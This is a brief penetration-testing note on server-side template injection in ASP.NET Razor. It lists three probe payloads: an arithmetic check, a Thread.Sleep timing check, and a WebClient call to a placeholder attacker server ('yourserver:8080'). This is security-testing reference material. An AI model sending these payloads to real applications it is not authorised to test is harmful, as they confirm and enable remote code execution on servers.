## the aspnet equiv of template injection - sometimes when JTEE plugin pings on aspnet apps they may be vuln to this
`@((8*8).ToString())`  
`@{System.Threading.Thread.Sleep(5000);}`  
`@{new System.Net.WebClient().DownloadString("http://yourserver:8080/");}`  
